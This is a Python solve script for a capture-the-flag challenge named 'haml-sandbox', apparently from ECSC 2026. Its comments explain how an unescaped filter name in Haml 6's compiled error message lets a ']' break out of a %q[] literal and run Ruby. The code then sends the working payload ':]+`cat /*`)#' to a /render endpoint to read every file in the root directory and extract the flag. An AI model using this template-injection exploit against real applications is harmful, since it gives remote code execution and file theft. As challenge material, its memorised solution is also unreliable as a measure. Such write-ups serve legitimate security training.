#!/usr/bin/env python3
"""Solve script for `haml-sandbox`.

Usage: solve.py <host> <port>
       solve.py <url>          e.g. https://<session>.challenge.ecsc2026.de/
"""

import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
import os

# Haml 6 does not raise on an unknown filter name while parsing: it compiles the
# error into the template, as a raise statement whose message is a %q[] literal.
#
#     :nope   ->   raise Haml::SyntaxError.new(%q[Invalid filter name ":nope".], 1)
#
# The name is interpolated into that literal unescaped, and %q[] is delimited by
# brackets, so a "]" ends the string early and everything after it is compiled as
# Ruby. The blocklist rejects "[" but not "]":
#
#     raise Haml::SyntaxError.new(%q[Invalid filter name ":] + `cat /*`)#".], 1)
#
# "+ `cat /*`" appends the command output to the message, ")" closes the .new(
# call, and "#" comments out the trailing garbage. The exception is then caught
# by the app and echoed back with its message, flag included. `cat /*` reads
# every file in / -- the directories fail to stderr, which the backticks drop.
PAYLOAD = ":]+`cat /*`)#"

FLAG_RE = re.compile(r"ECSC\{[^}]*\}")


def target():
    """Accept either "<host> <port>" or a single URL."""
    args = sys.argv[1:]
    if len(args) == 0 and "SESSION_ENDPOINT" in os.environ:
        endpoint = os.environ["SESSION_ENDPOINT"]
        parsed = urllib.parse.urlparse(endpoint)
        if not parsed.hostname or not parsed.port:
            sys.exit(f"bad SESSION_ENDPOINT: {endpoint!r}")

        scheme = "https" if parsed.scheme in ("https", "tls", "ssl") else "http"

        return "%s://%s:%s/render" % (scheme, parsed.hostname, parsed.port)

    if len(args) == 1 and "://" in args[0]:
        return args[0].rstrip("/") + "/render"
    if len(args) == 2:
        scheme = "https" if args[1] == "443" else "http"
        return "%s://%s:%s/render" % (scheme, args[0], args[1])
    sys.exit("usage: %s <host> <port> | %s <url>" % (sys.argv[0], sys.argv[0]))


def render(url, template):
    body = urllib.parse.urlencode({"template": template}).encode()
    request = urllib.request.Request(url, data=body, method="POST")
    # A raised template error is answered with a 500, and that response body is
    # exactly what the payload is after, so read the error body too.
    try:
        with urllib.request.urlopen(
            request, timeout=30, context=ssl._create_unverified_context()
        ) as response:
            return response.read().decode(errors="replace")
    except urllib.error.HTTPError as error:
        return error.read().decode(errors="replace")


def main():
    url = target()
    response = render(url, PAYLOAD)

    match = FLAG_RE.search(response)
    if not match:
        sys.exit("no flag in response: %r" % response[:500])

    flag = match.group(0)
    with open("/flag", "w") as flag_file:
        flag_file.write(flag)
    print(flag)

main()
